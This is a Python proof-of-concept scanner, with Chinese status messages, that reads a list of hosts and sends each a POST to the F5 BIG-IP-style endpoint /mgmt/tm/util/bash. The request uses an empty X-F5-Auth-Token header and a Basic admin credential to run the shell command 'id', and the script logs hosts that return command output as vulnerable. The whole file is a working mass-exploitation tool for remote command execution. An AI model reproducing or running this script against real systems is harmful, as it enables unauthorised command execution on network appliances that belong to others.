import requests
import sys
import random
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
def poc():
    with open(r"ip.txt", "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            vun_url=url + "/mgmt/tm/util/bash"
            headers={
                        "Authorization": "Basic YWRtaW46QVNhc1M=",
                        "X-F5-Auth-Token": "",
                        "Content-Type": "application/json"
                    }
            data='{"command":"run","utilCmdArgs":"-c id"}'
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                response=requests.post(url=vun_url,headers=headers,data=data,verify=False,timeout=2)
                #print(response.text)
                if "commandResult" in response.text and response.status_code ==200:
                    f = open('vul.txt', 'w') 
                    f.write(url)
                    f.write("\n")
                    f.close()
                    print("目标{}存在漏洞，响应为{}".format(url,json.loads(response.text)["commandResult"]))
                else:
                    print("目标{}不存在漏洞".format(url))
            except Exception as e:
                print("目标{}请求失败".format(url))

    
if __name__ == '__main__':
    poc()
        